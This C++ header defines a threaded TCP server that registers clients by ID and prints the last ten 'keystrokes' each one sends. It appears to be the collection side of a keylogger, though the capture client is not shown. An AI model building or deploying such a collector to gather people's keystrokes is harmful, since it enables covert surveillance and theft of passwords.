#ifndef SERVER_CROSS_HPP
#define SERVER_CROSS_HPP

#include "socket_utils_cross.hpp"
#include "thread_safe_queue.hpp"
#include <thread>
#include <atomic>
#include <unordered_map>
#include <mutex>
#include <vector>
#include <sstream>
#include <iostream>
using namespace std; 

class ClientHandler {
private:
    int client_socket_;
      atomic<bool> running_;
      thread handler_thread_;
      string client_id_;
    static   mutex display_mutex_;

public:
    ClientHandler(int socket, const   string& id) 
        : client_socket_(socket), running_(false), client_id_(id) {}

    ~ClientHandler() {
        stop();
    }

    void start() {
        running_ = true;
        handler_thread_ =   thread(&ClientHandler::handleClient, this);
    }

    void stop() {
        running_ = false;
        if (handler_thread_.joinable()) {
            handler_thread_.join();
        }
        if (client_socket_ >= 0) {
            close(client_socket_);
        }
    }

    bool isRunning() const {
        return running_;
    }

      string getClientId() const {
        return client_id_;
    }

    void setClientId(const   string& id) {
        client_id_ = id;
    }

private:
    void handleClient() {
          vector<  string> recent_keystrokes;
        const size_t N = 10;

          cout << "Client " << client_id_ << " connected" <<   endl;

        while (running_) {
              string data = SocketUtils::receiveData(client_socket_);
            if (data.empty()) {
                break;
            }

              istringstream stream(data);
              string line;
            while (  getline(stream, line)) {
                if (!line.empty()) {
                    // Check if it's a client ID message
                    if (line.find("CLIENT_ID: ") == 0) {
                          string id = line.substr(11);
                        setClientId(id);
                          cout << "Client identified as: " << id <<   endl;
                        continue;
                    }
                    
                    recent_keystrokes.push_back(line);
                    if (recent_keystrokes.size() > N) {
                        recent_keystrokes.erase(recent_keystrokes.begin());
                    }
                    displayRecentKeystrokes(recent_keystrokes);
                }
            }
        }

          cout << "Client " << client_id_ << " disconnected" <<   endl;
    }

    void displayRecentKeystrokes(const   vector<  string>& keystrokes) {
          lock_guard<  mutex> lock(display_mutex_);
        
          cout << "\n=== Client: " << client_id_ << " ===" <<   endl;
          cout << "Recent events:" <<   endl;
        
        for (size_t i = 0; i < keystrokes.size(); ++i) {
              cout << "  " << (i + 1) << ". " << keystrokes[i] <<   endl;
        }
        
        if (keystrokes.empty()) {
              cout << "  No events received yet" <<   endl;
        }
        
          cout << "==================" <<   endl;
    }
};

  mutex ClientHandler::display_mutex_;

class Server {
private:
    int port_;
      atomic<bool> running_;
      thread accept_thread_;
      unordered_map<  string,   unique_ptr<ClientHandler>> clients_;
      mutex clients_mutex_;
    int client_counter_;

public:
    Server(int port) : port_(port), running_(false), client_counter_(0) {}

    ~Server() {
        stop();
    }

    bool start() {
        if (running_) {
            return false;
        }

        running_ = true;
        accept_thread_ =   thread(&Server::acceptLoop, this);

          cout << "Server started on port " << port_ <<   endl;
          cout << "Waiting for connections..." <<   endl;

        return true;
    }

    void stop() {
        running_ = false;
        
        {
              lock_guard<  mutex> lock(clients_mutex_);
            for (auto& client : clients_) {
                client.second->stop();
            }
            clients_.clear();
        }

        if (accept_thread_.joinable()) {
            accept_thread_.join();
        }
        
        SocketUtils::cleanupWSA();
    }

private:
    void acceptLoop() {
        try {
            int server_socket = SocketUtils::createSocket();
            SocketUtils::bindSocket(server_socket, port_);
            SocketUtils::listenSocket(server_socket);

            while (running_) {
                int client_socket = SocketUtils::acceptConnection(server_socket);
                
                  string client_id = "Client_" +   to_string(++client_counter_);
                
                auto client_handler =   make_unique<ClientHandler>(client_socket, client_id);
                client_handler->start();
                
                {
                      lock_guard<  mutex> lock(clients_mutex_);
                    clients_[client_id] =   move(client_handler);
                }

                cleanupClients();
            }

            close(server_socket);
        } catch (const   exception& e) {
              cerr << "Server error: " << e.what() <<   endl;
        }
    }

    void cleanupClients() {
          lock_guard<  mutex> lock(clients_mutex_);
        for (auto it = clients_.begin(); it != clients_.end();) {
            if (!it->second->isRunning()) {
                it = clients_.erase(it);
            } else {
                ++it;
            }
        }
    }
};

#endif